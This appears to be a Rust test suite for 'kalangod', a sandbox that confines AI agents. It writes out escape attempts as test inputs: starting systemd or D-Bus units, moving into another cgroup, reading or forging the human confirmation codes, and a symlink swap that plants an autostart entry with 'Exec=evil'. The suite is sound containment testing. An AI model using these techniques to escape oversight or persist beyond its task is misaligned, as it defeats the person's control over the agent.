    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("docs/x.txt"), "conteudo": "evil\n"}));
    let (req, _) = h.join().unwrap();
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(req["startup"]["outro_nome"], true, "{req}");
    assert_eq!(r["isError"], true);
    assert_eq!(std::fs::read_to_string(deep.join("x.desktop")).unwrap(), "ok\n");
}


/// An agent's command cannot have anything started outside its own cgroup (where it would outlive the task):
/// - no local sockets (seccomp refuses socket(AF_UNIX)): no `systemd-run --user`, no `systemctl --user start`, no
///   D-Bus (activation of a user service on the session bus), no systemd private socket;
/// - setgid programs do not elevate (no_new_privs, set by Landlock): `crontab` cannot reach the cron spool (`at` the
///   same, where installed);
/// - /sys is read-only: it cannot move itself into another cgroup.
///
/// A pipe between a process and its children (socketpair) and network sockets still work.
#[test]
fn a_command_cannot_start_anything_outside_its_cgroup() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    let unit = format!("kalango-fuga-teste-{}", std::process::id());
    let cg = std::fs::read_to_string("/proc/self/cgroup").unwrap().lines().find_map(|l| l.strip_prefix("0::").map(str::to_string)).unwrap();
    let script = format!(
        "systemd-run --user --unit={unit} sleep 300 2>&1; echo systemd-run=$?; \
         systemctl --user start {unit}.service 2>&1; echo systemctl=$?; \
         python3 -c 'import socket,os; s=socket.socket(socket.AF_UNIX); s.connect(os.environ.get(\"XDG_RUNTIME_DIR\",\"/run/user/0\")+\"/bus\")' 2>&1 | tail -1; \
         crontab -l 2>&1; echo crontab=$?; \
         echo $$ > /sys/fs/cgroup{cg}/cgroup.procs 2>&1; echo cgroup=$?; \
         python3 -c 'import socket; a,b=socket.socketpair(); print(\"socketpair\", bool(a))'; \
         python3 -c 'import socket; socket.socket(socket.AF_INET); print(\"inet ok\")'");
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": d.area.join("docs")}));
    let out = r["structuredContent"]["saida"].as_str().unwrap_or("").to_string();
    let active = Command::new("systemctl").args(["--user", "is-active", &format!("{unit}.service")]).output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
    let _ = Command::new("systemctl").args(["--user", "stop", &format!("{unit}.service")]).output();
    assert_ne!(active, "active", "a transient unit escaped: {out}");
    assert!(!out.contains("systemd-run=0"), "{out}");
    assert!(out.contains("Operation not permitted") || out.contains("PermissionError"), "{out}");
    assert!(!out.contains("crontab=0") || out.contains("no crontab"), "{out}");
    assert!(!out.contains("cgroup=0"), "{out}");
    assert!(out.contains("socketpair True") && out.contains("inet ok"), "{out}");
}


// ---------------------------------------------------------------------------------------------------------------
// The Kalango Mind's confirmation gate (the Mind's docs/PATCH-KALANGOOS.md, section 2): what the agents' sandbox denies
// so that an agent cannot read the confirmation code the person's session reads, nor leave its sandbox to do it as the
// person. `%t` (the runtime folder) is made a folder of the test's own with KALANGOD_RUNTIME_BASE.

/// kalangod with the Mind's folders protected as in the installed configuration, the runtime base inside the test's
/// home (Landlock lets a command read the home, so a denial there is the rule's, not the place's).
fn start_mind_gate() -> Daemon {
    start_in(Some(Path::new(env!("CARGO_TARGET_TMPDIR"))), true, "", |cfg| {
        cfg.replace("/segredo\"]", "/segredo\", \"%t/kalango/mind-confirm\", \"~/.local/share/kalango/mind\"]")
    }, &[("KALANGOD_RUNTIME_BASE", "@AREA@/exec")])
}

/// (the codes folder, a file next to it that is not the Mind's) in the test's runtime folder
fn mind_places(d: &Daemon) -> (PathBuf, PathBuf) {
    use std::os::unix::fs::MetadataExt;
    let uid = std::fs::metadata(&d.area).unwrap().uid();
    let kalango = d.area.join("exec").join(uid.to_string()).join("kalango");
    std::fs::create_dir_all(&kalango).unwrap();
    std::fs::write(kalango.join("outro.txt"), "visivel").unwrap();
    (kalango.join("mind-confirm"), kalango.join("outro.txt"))
}

fn make_codes(dir: &Path, content: &str) -> PathBuf {
    std::fs::create_dir_all(dir).unwrap();
    std::fs::set_permissions(dir, std::os::unix::fs::PermissionsExt::from_mode(0o700)).unwrap();
    let t = dir.join("0f3c.token");
    std::fs::write(&t, content).unwrap();
    std::fs::set_permissions(&t, std::os::unix::fs::PermissionsExt::from_mode(0o600)).unwrap();
    t
}

/// The configuration kalangod runs with lists the folders (`%t` as written), and the file tools of an agent (read,
/// list, write, move, trash) are refused in the codes folder, in the Mind's database, and by a path through `..`, while
/// the neighbouring file of the runtime folder and the person's own folders still work.
#[test]
fn agent_file_tools_cannot_reach_the_mind_confirmation_codes() {
    let d = start_mind_gate();
    let mut c = Client::new(&d.sock);
    let (dir, outro) = mind_places(&d);
    let listed = c.rpc("kalango/protegidas", json!({})).to_string();
    assert!(listed.contains(&dir.display().to_string()) && !listed.contains("%t"), "{listed}");
    let content = format!("valor-{}", 8841);
    let token = make_codes(&dir, &content);
    let db = d.area.join(".local/share/kalango/mind");
    std::fs::create_dir_all(&db).unwrap();
    std::fs::write(db.join("mind.db"), "banco").unwrap();
    // (control: what is next to it is read)
    let r = c.call("arquivos.ler", json!({"caminho": outro}));
    assert_ne!(r["isError"], true, "{r}");
    assert!(r.to_string().contains("visivel"), "{r}");
    let via_dots = dir.parent().unwrap().join("../kalango/mind-confirm/0f3c.token");
    let docs = d.area.join("Documentos");
    for (tool, args) in [
        ("arquivos.ler", json!({"caminho": token})),
        ("arquivos.ler", json!({"caminho": via_dots})),
        ("arquivos.listar", json!({"caminho": dir})),
        ("arquivos.escrever", json!({"caminho": dir.join("forjado.token"), "conteudo": "x"})),
        ("arquivos.mover", json!({"de": token, "para": docs.join("roubado")})),
        ("arquivos.mover", json!({"de": docs.join("nada"), "para": dir.join("entrou")})),
        ("arquivos.lixeira", json!({"caminho": token})),
        ("arquivos.ler", json!({"caminho": db.join("mind.db")})),
        ("arquivos.escrever", json!({"caminho": db.join("planta.db"), "conteudo": "x"})),
    ] {
        let r = c.call(tool, args.clone());
        assert_eq!(r["isError"], true, "{tool} {args} should be refused: {r}");
        assert!(!r.to_string().contains(&content), "{r}");
    }
    assert_eq!(std::fs::read_to_string(&token).unwrap(), content, "the code is still there, untouched");
    assert!(!dir.join("forjado.token").exists() && !dir.join("entrou").exists() && !docs.join("roubado").exists() && !db.join("planta.db").exists());
    // the person's own files are still served
    std::fs::write(docs.join("nota.txt"), "oi").unwrap();
    assert_ne!(c.call("arquivos.ler", json!({"caminho": docs.join("nota.txt")}))["isError"], true);
}

/// A command an agent runs (Landlock and the cut of the folders it reads) cannot read, write, move or link the
/// codes, also when the folder is made again with a new inode and when it is made while the command runs; the
/// neighbouring file is read in the same command.
#[test]
fn an_agent_command_cannot_read_or_forge_the_mind_confirmation_codes() {
    let d = start_mind_gate();
    let mut c = Client::new(&d.sock);
    let (dir, outro) = mind_places(&d);
    let content = format!("valor-{}", 5530);
    let token = make_codes(&dir, &content);
    let docs = d.area.join("Documentos");
    let sh = |c: &mut Client, script: &str| c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": docs}));
    let (t, o, k) = (token.display(), outro.display(), dir.display());
    // (control: the neighbouring file is read, so the denials below are the codes folder's)
    let r = sh(&mut c, &format!("cat {o}"));
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    assert!(r["structuredContent"]["saida"].as_str().unwrap().contains("visivel"), "{r}");
    for script in [format!("cat {t}"), format!("python3 -c \"import os; os.read(os.open('{t}', os.O_RDONLY), 99)\""),
        format!("echo forjado > {k}/forjado.token"), format!("echo 1 > {t}"), format!("mv {k} {k}-movida"), format!("mv {t} ."),
        format!("ln {t} ."), format!("ln -s {t} elo && cat elo"), format!("rm {t}")] {
        let r = sh(&mut c, &script);
        assert_ne!(r["structuredContent"]["codigo"], 0, "`{script}` should fail: {r}");
        assert!(!r.to_string().contains(&content), "{script}: {r}");
    }
    // (Landlock's rule to list a folder covers the folders below it, so the names in the codes folder may still be listed
    // when the kernel guard (eBPF) is off; a name is a review's id, which is no code: the content is what stays out)
    let r = sh(&mut c, &format!("ls {k}"));
    assert!(!r.to_string().contains(&content), "{r}");
    assert_eq!(std::fs::read_to_string(&token).unwrap(), content);
    assert!(!dir.join("forjado.token").exists() && !docs.join("0f3c.token").exists());
    // the folder made again (a new inode, a new code): the rule goes by the place
    std::fs::remove_dir_all(&dir).unwrap();
    let token2 = make_codes(&dir, &format!("valor-{}", 7002));
    let r = sh(&mut c, &format!("cat {}", token2.display()));
    assert_ne!(r["structuredContent"]["codigo"], 0, "{r}");
    assert!(!r.to_string().contains("7002"), "{r}");
    // made while the command runs (the service makes it when it first needs it)
    std::fs::remove_dir_all(&dir).unwrap();
    let later = dir.clone();
    let maker = std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(800));
        make_codes(&later, &format!("valor-{}", 9917));
    });
    let r = sh(&mut c, &format!("sleep 2; cat {t}; echo fim"));
    maker.join().unwrap();
    assert!(!r.to_string().contains("9917"), "{r}");
    assert!(r.to_string().contains("fim"), "{r}");
}

/// The part of the gate the home cannot show: with `%t` really outside the caller's home (under `/run`, which a command
/// reads whole in `SISTEMA_LEITURA`), only the cut of `admin::agent_landlock` keeps a command off the codes. Falls on a host (the CI skips it) if the
/// command's Landlock goes back to the whole of `/run`. The runtime base is a folder of the test's own under
/// `/run/user/UID` (never the real `kalango/mind-confirm` of the session).
#[test]
fn a_command_cannot_read_the_mind_confirmation_codes_outside_its_home() {
    let uid = nix::unistd::getuid().as_raw();
    let base = Path::new("/run/user").join(uid.to_string());
    if !base.is_dir() {
        host_test_unavailable("no /run/user/UID");
        return;
    }
    let hold = tempfile::Builder::new().prefix("kalango-teste-").tempdir_in(&base).unwrap();
    let rt = hold.path().to_path_buf();
    let d = start_in(Some(Path::new(env!("CARGO_TARGET_TMPDIR"))), true, "", |cfg| cfg.replace("/segredo\"]", "/segredo\", \"%t/kalango/mind-confirm\"]"),
        &[("KALANGOD_RUNTIME_BASE", rt.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    let kalango = rt.join(uid.to_string()).join("kalango");
    std::fs::create_dir_all(&kalango).unwrap();
    std::fs::write(kalango.join("outro.txt"), "visivel").unwrap();
    let content = format!("valor-{}", 4417);
    let token = make_codes(&kalango.join("mind-confirm"), &content);
    let docs = d.area.join("Documentos");
    let sh = |c: &mut Client, script: &str| c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": docs}));
    // control: the neighbour in the same runtime folder is read through the very same `/run` grant
    let r = sh(&mut c, &format!("cat {}", kalango.join("outro.txt").display()));
    assert_eq!(r["structuredContent"]["codigo"], 0, "control: {r}");
    assert!(r.to_string().contains("visivel"), "{r}");
    let r = sh(&mut c, &format!("cat {}", token.display()));
    assert_ne!(r["structuredContent"]["codigo"], 0, "{r}");
    assert!(!r.to_string().contains(&content), "{r}");
    // made again while it runs
    std::fs::remove_dir_all(kalango.join("mind-confirm")).unwrap();
    let later = kalango.join("mind-confirm");
    let maker = std::thread::spawn(move || { std::thread::sleep(Duration::from_millis(800)); make_codes(&later, "valor-6603"); });
    let r = sh(&mut c, &format!("sleep 2; cat {}; echo fim", token.display()));
    maker.join().unwrap();
    assert!(r.to_string().contains("fim") && !r.to_string().contains("6603"), "{r}");
}

/// No tool of kalangod gives an agent a way to confirm the Mind's items: nothing in the catalogue is named for the
/// Mind's confirmation, and none of its descriptions or schemas points at the confirmation folder. (The Mind's own
/// tools for agents, `conhecimento.*`, are a later phase; their catalogue has no confirmation either.)
#[test]
fn kalangod_exposes_no_path_for_an_agent_to_confirm_the_mind() {
    let d = start_mind_gate();
    let mut c = Client::new(&d.sock);
    let list = c.rpc("tools/list", json!({}));
    let tools = list["result"]["tools"].as_array().expect("tools/list");
    assert!(!tools.is_empty());
    for t in tools {
        let name = t["name"].as_str().unwrap_or("");
        let text = t.to_string().to_lowercase();
        assert!(!text.contains("mind-confirm") && !text.contains("kalango-mind"), "{name} points at the Mind's confirmation");
        assert!(!((name.starts_with("conhecimento.") || name.starts_with("mind.") || name.starts_with("memoria.")) && name.contains("confirm")), "{name}");
    }
}

/// A test that needs the host (a delegated cgroup, the user's systemd, `/run/user/UID`) cannot run here. With
/// `KALANGOD_REQUIRE_HOST_TESTS=1` that is a failure, not a silent pass; without it, a visible line says it did not run.
fn host_test_unavailable(why: &str) -> bool {
    assert!(std::env::var("KALANGOD_REQUIRE_HOST_TESTS").as_deref() != Ok("1"), "KALANGOD_REQUIRE_HOST_TESTS=1 and the host cannot run this test: {why}");
    eprintln!("SKIPPED (needs the host/VM, it proved nothing here): {why}");
    true
}

/// `KALANGOD_REQUIRE_HOST_TESTS` itself, with no host needed: the same test binary runs a host test where the host is
/// missing (no `systemd-run` on the `PATH`). With `=1` it fails and says why; without it, it skips with a visible
/// `SKIPPED` line. Falls if the variable stops being honoured.
#[test]
fn the_require_host_tests_variable_turns_a_skip_into_a_failure() {
    let run = |require: Option<&str>| {
        let mut c = Command::new(std::env::current_exe().unwrap());
        c.args(["--ignored", "--exact", "a_command_cannot_ask_the_user_manager_to_start_a_unit", "--nocapture", "--test-threads=1"]).env("PATH", "/nonexistent").env_remove("KALANGOD_REQUIRE_HOST_TESTS");
        if let Some(v) = require {
            c.env("KALANGOD_REQUIRE_HOST_TESTS", v);
        }
        let o = c.output().unwrap();
        (o.status.success(), format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
    };
    let (ok, out) = run(Some("1"));
    assert!(!ok && out.contains("KALANGOD_REQUIRE_HOST_TESTS=1 and the host cannot run this test"), "required: {out}");
    let (ok, out) = run(None);
    assert!(ok && out.contains("SKIPPED"), "not required: {out}");
    let (ok, out) = run(Some("0"));
    assert!(ok && out.contains("SKIPPED"), "=0: {out}");
}

/// Where the user's delegated cgroup folder is (`.../user@UID.service/app.slice`), if this session has one.
fn app_slice_dir() -> Option<PathBuf> {
    let cg = std::fs::read_to_string("/proc/self/cgroup").ok()?.lines().find_map(|l| l.strip_prefix("0::").map(str::to_string))?;
    let i = cg.find("/app.slice")? + "/app.slice".len();
    Some(PathBuf::from(format!("/sys/fs/cgroup{}", &cg[..i])))
}

/// An agent's command cannot do what a same-user process does to leave `kalango-agentes.slice`: make a folder in
/// `app.slice` and write its pid in `cgroup.procs` (no root needed). Control: the test itself, outside the sandbox,
/// can (a `sleep` of its own is moved); without the control (no delegated cgroup here) the test says so and stops: it
/// needs the VM then.
#[test]
#[ignore = "precisa de VM/cgroup delegado"]
fn a_command_cannot_move_itself_to_another_cgroup() {
    let Some(app) = app_slice_dir() else { host_test_unavailable("no delegated cgroup in this session"); return };
    let ctl = app.join(format!("kalango-fuga-ctl-{}", std::process::id()));
    if std::fs::create_dir(&ctl).is_err() {
        host_test_unavailable(&format!("this session cannot make a cgroup in {}", app.display()));
        return;
    }
    let mut sleeper = Command::new("sleep").arg("30").spawn().unwrap();
    let control = std::fs::write(ctl.join("cgroup.procs"), sleeper.id().to_string());
    let _ = sleeper.kill();
    let _ = sleeper.wait();
    for _ in 0..50 {
        if std::fs::remove_dir(&ctl).is_ok() {
            break;
        }
        std::thread::sleep(Duration::from_millis(100));
    }
    if control.is_err() {
        host_test_unavailable(&format!("this session cannot move a process between cgroups ({control:?})"));
        return;
    }
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    let mine = app.join(format!("kalango-fuga-{}", std::process::id()));
    let pre = app.join(format!("kalango-fuga-pre-{}", std::process::id()));
    std::fs::create_dir(&pre).unwrap();
    let script = format!("mkdir {mine} 2>&1; echo mkdir=$?; echo $$ > {mine}/cgroup.procs 2>&1; echo move=$?; echo $$ > {pre}/cgroup.procs 2>&1; echo moveto=$?; \
        echo $$ > {app}/cgroup.procs 2>&1; echo moveapp=$?; cat /proc/self/cgroup", mine = mine.display(), pre = pre.display(), app = app.display());
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": d.area.join("docs")}));
    let out = r["structuredContent"]["saida"].as_str().unwrap_or("").to_string();
    let made = mine.exists();
    let _ = std::fs::remove_dir(&mine);
    let _ = std::fs::remove_dir(&pre);
    assert!(!made, "a cgroup folder was made from inside the sandbox: {out}");
    for step in ["mkdir=0", "move=0", "moveto=0", "moveapp=0"] {
        assert!(!out.contains(step), "{step}: {out}");
    }
    assert!(out.contains("moveto=") && out.contains("kalango-agentes.slice"), "the command ran, and stayed in the agents' slice: {out}");
}

/// An agent's command cannot reach the user manager's D-Bus (`StartTransientUnit`) nor use `systemctl --user` or
/// `systemd-run`: nothing it asks for runs outside its cgroup as the person. Control: the same call from the test (the
/// person) starts the unit.
#[test]
#[ignore = "precisa de VM/systemd de usuário"]
fn a_command_cannot_ask_the_user_manager_to_start_a_unit() {
    if !has_user_systemd() || Command::new("busctl").arg("--version").output().is_err() {
        host_test_unavailable("no user systemd or busctl in this session");
        return;
    }
    let call = |unit: &str| format!("busctl --user call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartTransientUnit \
        'ssa(sv)a(sa(sv))' {unit}.service fail 2 Description s x ExecStart 'a(sasb)' 1 /usr/bin/sleep 2 sleep 300 false 0");
    let active = |unit: &str| Command::new("systemctl").args(["--user", "is-active", &format!("{unit}.service")]).output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default();
    let stop = |unit: &str| { let _ = Command::new("systemctl").args(["--user", "stop", &format!("{unit}.service")]).output(); };
    let pid = std::process::id();
    let (ctl, bus, run, ctlsh) = (format!("kalango-dbus-ctl-{pid}"), format!("kalango-dbus-{pid}"), format!("kalango-dbus-run-{pid}"), format!("kalango-dbus-sh-{pid}"));
    // control, from outside the sandbox
    let r = Command::new("sh").args(["-c", &call(&ctl)]).output().unwrap();
    let controlled = r.status.success() && active(&ctl) == "active";
    stop(&ctl);
    assert!(controlled, "the person's own call must work (control): {}", String::from_utf8_lossy(&r.stderr));
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    let script = format!("{}; echo busctl=$?; systemd-run --user --unit={run} sleep 300; echo run=$?; systemctl --user start {ctlsh}.service; echo systemctl=$?; \
        systemd-run --user --scope sleep 1; echo scope=$?", call(&bus));
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": d.area.join("docs")}));
    let out = r["structuredContent"]["saida"].as_str().unwrap_or("").to_string();
    let seen: Vec<String> = [&bus, &run].iter().map(|u| active(u)).collect();
    stop(&bus);
    stop(&run);
    assert!(seen.iter().all(|s| s != "active"), "a unit started outside the sandbox: {seen:?} {out}");
    for step in ["busctl=0", "run=0", "systemctl=0", "scope=0"] {
        assert!(!out.contains(step), "{step}: {out}");
    }
    assert!(out.contains("busctl=") && out.contains("scope="), "the command ran: {out}");
}

/// VirtualDesk copying a file out of a machine writes it into a staging file no agent reaches; kalangod then puts it
/// in place without following links: a folder of the destination turned into a link to autostart meanwhile (the
/// stand-in does it while "copying") stops it, nothing lands there.
#[test]
fn a_copy_out_of_a_machine_never_follows_a_link_put_on_the_way() {
    let dir = tempfile::tempdir().unwrap();
    let vd = dir.path().join("virtualdesk");
    let swap = dir.path().join("trocar.txt");
    std::fs::write(&vd, format!(r#"#!/usr/bin/python3
import json, os, sys
a = sys.argv[1:]
if a[1] == "--aprovacao":
    print(json.dumps({{"pedir": False}})); sys.exit()
args = json.loads(a[2])
if a[1] == "vm.copiar_arquivo":
    open(args["para"], "w").write("[Desktop Entry]\nExec=evil\n")
    if os.path.exists("{swap}"):
        pasta, alvo = open("{swap}").read().split("\n")[:2]
        os.rename(pasta, pasta + ".velha"); os.symlink(alvo, pasta)
print(json.dumps({{"valor": {{"para": args.get("para")}}, "resumo": "copiado"}}))
"#, swap = swap.display())).unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&vd, std::fs::Permissions::from_mode(0o755)).unwrap();
    let d = start_startup_env(&[("KALANGO_VIRTUALDESK", vd.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join(".config/autostart")).unwrap();
    std::fs::create_dir_all(d.area.join("Documentos/d")).unwrap();
    // an ordinary copy lands, and the staging folder is gone
    let r = c.call("vm.copiar_arquivo", json!({"id": "ana", "sentido": "da_maquina", "de": "/tmp/x", "para": d.area.join("Documentos/de-la.txt")}));
    assert_eq!(r["isError"], false, "{r}");
    assert!(std::fs::read_to_string(d.area.join("Documentos/de-la.txt")).unwrap().contains("Desktop Entry"));
    let staged = std::fs::read_dir(d.area.join(".local/state/kalango/vm-copias")).map(|r| r.count()).unwrap_or(0);
    assert_eq!(staged, 0, "the staging folder is removed");
    // the destination's folder becomes a link to autostart while VirtualDesk copies
    std::fs::write(&swap, format!("{}\n{}\n", d.area.join("Documentos/d").display(), d.area.join(".config/autostart").display())).unwrap();
    let r = c.call("vm.copiar_arquivo", json!({"id": "ana", "sentido": "da_maquina", "de": "/tmp/x", "para": d.area.join("Documentos/d/x.desktop")}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(!d.area.join(".config/autostart/x.desktop").exists(), "nothing lands in autostart");
}

/// The `vm.*` tools against a real Kalango VirtualDesk and a real QEMU (runs only with
/// `KALANGO_TESTE_VIRTUALDESK=<kalango-virtualdesk>` and `KALANGO_TESTE_VIRTUALDESK_MODELO=<a library folder>` holding
/// one template machine with a snapshot with memory and qemu-guest-agent running in it; the library is copied, never
/// used in place). A sandbox copy: asked for the first time, then "internet only" — this computer is out of reach from
/// inside it — and what the agent does in it does not ask, except opening its network wider or sharing a folder.
#[test]
fn virtualdesk_sandbox_copy_through_kalangod() {
    let (Ok(vd), Ok(modelo)) = (std::env::var("KALANGO_TESTE_VIRTUALDESK"), std::env::var("KALANGO_TESTE_VIRTUALDESK_MODELO")) else {
        eprintln!("sem KALANGO_TESTE_VIRTUALDESK e KALANGO_TESTE_VIRTUALDESK_MODELO: pulado");
        return;
    };
    let lib = tempfile::tempdir().unwrap();
    let maquinas = lib.path().join("maquinas");
    assert!(Command::new("cp").args(["-r", "--reflink=auto", &modelo]).arg(&maquinas).status().unwrap().success());
    let template = std::fs::read_dir(&maquinas).unwrap().flatten().next().unwrap().file_name().to_string_lossy().to_string();
    let (cfg, cache) = (lib.path().join("config"), lib.path().join("cache"));
    // the network this computer is on, as nmcli would say (a stand-in)
    let nmcli = lib.path().join("nmcli");
    std::fs::write(&nmcli, "#!/bin/sh\necho 'Celular de Ana'\n").unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&nmcli, std::fs::Permissions::from_mode(0o755)).unwrap();
    let env = [
        ("KALANGO_NMCLI", nmcli.to_str().unwrap()),
        ("KALANGO_VIRTUALDESK", vd.as_str()),
        ("KALANGO_VIRTUALDESK_DIR", maquinas.to_str().unwrap()),
        // (VirtualDesk's choices for the agents: the test's own folder, never the person's ~/.config/kalango)
        ("KALANGO_VIRTUALDESK_TEST_HOME", cfg.to_str().unwrap()),
        ("XDG_CACHE_HOME", cache.to_str().unwrap()),
        // the watcher of networks kept off the agents, often (the server's default is 5 s)
        ("KALANGOD_VIGIA_REDE_MS", "300"),
    ];
    let d = start_full_env(true, "", |c| c, &env);
    let mut c = Client::new(&d.sock);
    // a server on every address of this computer: the copy must not reach it
    let server = std::net::TcpListener::bind("0.0.0.0:0").unwrap();
    let port = server.local_addr().unwrap().port();

    let l = c.call("vm.listar", json!({}));
    assert_eq!(l["isError"], false, "{l}");
    // the first copy for this program asks
    let h = approve_next(d.sock.clone());
    let made = c.call("vm.clonar", json!({"id": template}));
    assert!(h.join().unwrap().contains("aprovado"), "vm.clonar asks the first time");
    assert_eq!(made["isError"], false, "{made}");
    assert_eq!(made["structuredContent"]["rede"], "internet", "{made}");
    let id = made["structuredContent"]["id"].as_str().unwrap().to_string();

    // inside it, nothing asks: this computer (10.0.2.2 and its own address) is out of reach
    let probe = format!("for u in http://10.0.2.2:{port}/ http://192.168.0.1/; do timeout 8 wget -q -T 6 -O /dev/null $u 2>&1; done; true");
    let r = c.call("vm.executar", json!({"id": id, "comando": probe}));
    assert_eq!(r["isError"], false, "{r}");
    let out = r["structuredContent"]["saida"].as_str().unwrap_or("").to_string() + r["structuredContent"]["erros"].as_str().unwrap_or("");
    assert_eq!(out.matches("Network unreachable").count(), 2, "{out}");

    // opening its network wider, or sharing a folder of the person's, asks again
    let h = approve_next(d.sock.clone());
    let wide = c.call("vm.ajustes", json!({"id": id, "rede": "casa"}));
    assert!(h.join().unwrap().contains("aprovado"), "opening the network asks: {wide}");
    assert_eq!(wide["isError"], false, "{wide}");
    let h = approve_next(d.sock.clone());
    let share = c.call("vm.pastas", json!({"id": id, "acao": "compartilhar", "caminho": d.area}));
    assert!(h.join().unwrap().contains("aprovado"), "sharing a folder asks: {share}");

    // turning it off and deleting it at the end do not
    let off = c.call("vm.desligar", json!({"id": id, "forcar": true}));
    assert_eq!(off["isError"], false, "{off}");
    let del = c.call("vm.apagar", json!({"id": id}));
    assert_eq!(del["isError"], false, "{del}");

    // the template is not marked as a template for sandboxes: copying it asks every time (denied here)
    let h = deny_next(d.sock.clone());
    let again = c.call("vm.clonar", json!({"id": template}));
    assert!(h.join().unwrap().contains("negado"), "a machine that is not a template asks every time: {again}");
    // the person marks it as a template (Settings › General): copying it no longer asks after the first time
    let mj = maquinas.join(&template).join("machine.json");
    let mut m: Value = serde_json::from_str(&std::fs::read_to_string(&mj).unwrap()).unwrap();
    m["template"] = json!(true);
    std::fs::write(&mj, m.to_string()).unwrap();

    // a copy with the home network asks every time, even though this program's first copy was approved (denied
    // here: nothing is made)
    for rede in ["casa", "nat"] {
        let h = deny_next(d.sock.clone());
        let wide = c.call("vm.clonar", json!({"id": template, "rede": rede}));
        assert!(h.join().unwrap().contains("negado"), "vm.clonar {rede} asks again");
        assert_eq!(wide["isError"], true, "{wide}");
    }
    let l = c.call("vm.listar", json!({}));
    assert_eq!(l["structuredContent"]["maquinas"].as_array().unwrap().len(), 1, "only the template: {l}");

    // a copy with network, paused, when this computer joins a network the person keeps the agents off: the watcher
    // turns it off and says so in the timeline
    // (the first copy of a template asks once: the copies of a machine that was not a template asked every time, and a
    // call that asked "every time" never counts as this program's first time)
    let h = approve_next(d.sock.clone());
    let made = c.call("vm.clonar", json!({"id": template}));
    assert!(h.join().unwrap().contains("aprovado"), "the first copy of the template asks: {made}");
    assert_eq!(made["isError"], false, "{made}");
    let a = made["structuredContent"]["id"].as_str().unwrap().to_string();
    assert_eq!(c.call("vm.pausar", json!({"id": a}))["isError"], false);
    c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": false}));
    let state = |c: &mut Client| {
        let l = c.call("vm.listar", json!({}));
        l["structuredContent"]["maquinas"].as_array().unwrap().iter().find(|m| m["id"] == a.as_str()).map(|m| m["estado"].as_str().unwrap_or("").to_string()).unwrap_or_default()
    };
    for _ in 0..40 {
        if state(&mut c) == "desligada" {
            break;
        }
        std::thread::sleep(Duration::from_millis(250));
    }
    assert_eq!(state(&mut c), "desligada", "the copy was turned off when the network became one kept off the agents");
    let tl = c.call("linha_do_tempo.listar", json!({}));
    assert!(tl.to_string().contains("rede sem agentes") && tl.to_string().contains(&a), "in the timeline: {tl}");
    // and nothing starts it again while there: turning on, continuing, a command, going back to a snapshot with memory
    for (tool, args) in [
        ("vm.ligar", json!({"id": a})),
        ("vm.continuar", json!({"id": a})),
        ("vm.executar", json!({"id": a, "comando": "true"})),
        ("vm.snapshot", json!({"id": a, "acao": "voltar", "tag": "s1"})),
    ] {
        let r = c.call(tool, args.clone());
        assert_eq!(r["isError"], true, "{tool}: {r}");
        assert!(r["content"][0]["text"].as_str().unwrap().contains("Celular de Ana"), "{tool}: {r}");
    }
    assert_eq!(state(&mut c), "desligada");
    // a program outside the agents' slice that is not kalangod (a connector that got out, a script) cannot change a
    // machine from the command line: no proof from kalangod, no change — whatever key names the machine
    for (tool, args) in [("vm.ajustes", json!({"maquina": a, "microfone": true, "rede": "nat"})), ("vm.ligar", json!({"id": a}))] {
        let o = Command::new(&vd).args(["ferramenta", tool, &args.to_string()]).envs(env.iter().copied()).stdin(std::process::Stdio::null()).output().unwrap();
        let out = String::from_utf8_lossy(&o.stdout).to_string();
        assert!(out.contains("kalangod") && out.contains("erro"), "{tool}: {out}");
        // nor with a made-up proof
        let mut ch = Command::new(&vd).args(["ferramenta", tool, &args.to_string()]).envs(env.iter().copied()).stdin(std::process::Stdio::piped()).stdout(std::process::Stdio::piped()).spawn().unwrap();
        {
            use std::io::Write;
            writeln!(ch.stdin.take().unwrap(), "prova {}", "ab".repeat(16)).unwrap();
        }
        let out = String::from_utf8_lossy(&ch.wait_with_output().unwrap().stdout).to_string();
        assert!(out.contains("erro"), "{tool} with a made-up proof: {out}");
    }
    assert_eq!(state(&mut c), "desligada");
    // kalangod itself refuses a machine named by an undeclared key (only "id" is declared)
    let r = c.call("vm.ajustes", json!({"maquina": a, "microfone": true}));
    assert_eq!(r["isError"], true, "{r}");
    let why = r["content"][0]["text"].as_str().unwrap();
    assert!(why.contains("'id'") || why.contains("maquina"), "{r}");
    // and with the declared key too, an undeclared one is refused
    let r = c.call("vm.ajustes", json!({"id": a, "maquina": a, "microfone": true}));
    assert!(r["content"][0]["text"].as_str().unwrap().contains("maquina"), "{r}");
    // a copy never takes another machine's name; and a machine named like another's id is never mistaken for it:
    // the template (NAT) cannot be started by naming it, even with a machine without network called like its id
    let named = c.call("vm.clonar", json!({"id": template, "nome": template, "rede": "nenhuma"}));
    assert_eq!(named["isError"], true, "{named}");
    let other = maquinas.join("outra");
    std::fs::create_dir_all(&other).unwrap();
